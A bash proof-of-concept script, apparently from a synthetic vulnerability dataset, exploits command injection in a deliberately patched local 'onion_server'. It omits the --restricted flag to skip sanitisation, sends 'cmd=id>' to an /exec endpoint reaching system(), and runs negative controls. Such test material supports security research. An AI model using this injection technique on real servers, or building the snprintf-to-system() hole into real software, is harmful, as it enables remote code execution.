#!/usr/bin/env bash
# PoC for 098_onion_C3I2S3
# Axes: C3 (three flags + utility function) / I2 (snprintf buffer then system()) / S3 (flag-gated check)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# C3: two required flags (--exec-mode, --diag-mode) via exec_gate_open(); third flag (--restricted)
#     enables the S3 sanitization check.
# S3 bypass: omit --restricted; the sanitization block is entirely skipped.
#
# The patched binary (onion_server) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/onion_server"
WWWROOT="/tmp/poc_098_www"
MARKER="/tmp/poc_098_marker"
PORT=18098

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server (WITHOUT --restricted — bypasses S3 check) ───────────────────
echo "[*] starting onion_server with --exec-mode --diag-mode (no --restricted) on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode --diag-mode --wwwroot "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# ── trigger ────────────────────────────────────────────────────────────────────
# S3 is skipped (--restricted not set); I2 copies cmd via snprintf → system()
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control 1: metacharacters blocked when --restricted active ─────────
echo "[*] verifying S3: metacharacters must be blocked when --restricted is set..."
NEG_SAFE_PORT=$((PORT + 100))
"$BINARY" --port "$NEG_SAFE_PORT" --exec-mode --diag-mode --restricted --wwwroot "$WWWROOT" &
SAFE_PID=$!
sleep 0.5
rm -f "$MARKER"
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_SAFE_PORT}/exec?cmd=id%3Bid" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "400" ]]; then
    echo "[+] S3 check passed: semicolon blocked with 400 in --restricted mode"
else
    echo "[!] S3 check unexpected response: $HTTP_CODE"
fi

# ── negative control 2: endpoint absent without required C3 flags ──────────────
echo "[*] verifying C3 gate: endpoint must be absent without --diag-mode..."
NEG_PORT=19098
"$BINARY" --port "$NEG_PORT" --exec-mode --wwwroot "$WWWROOT" &
GATE_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$GATE_PID" 2>/dev/null; wait "$GATE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --diag-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
